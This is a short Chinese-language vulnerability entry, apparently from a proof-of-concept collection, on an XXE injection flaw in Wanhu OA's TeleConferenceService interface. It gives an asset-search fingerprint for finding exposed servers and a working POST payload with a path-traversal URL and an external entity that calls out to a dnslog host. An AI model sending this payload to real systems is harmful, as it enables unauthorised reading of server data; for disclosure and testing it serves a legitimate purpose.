# 万户OA TeleConferenceService XXE注入漏洞

## 漏洞描述

万户OA TeleConferenceService接口存在XXE注入漏洞，攻击者通过漏洞可以继续XXE注入获取服务器敏感信息

## 漏洞影响

<a-checkbox checked>万户OA</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="万户网络-ezOFFICE"</a-checkbox></br>

## 漏洞复现

产品页面

![img](../../../.vuepress/public/img/1631323798806-958050db-05f6-47ca-95b4-74487ee67a66-20220905135417878.png)

验证POC

```html
POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "http://fep6kf.dnslog.cn" >]>        
<value>&xxe;</value>
```

![img](../../../.vuepress/public/img/1662357047551-20d92354-25b8-45d0-8be5-fd1437a826ce.png)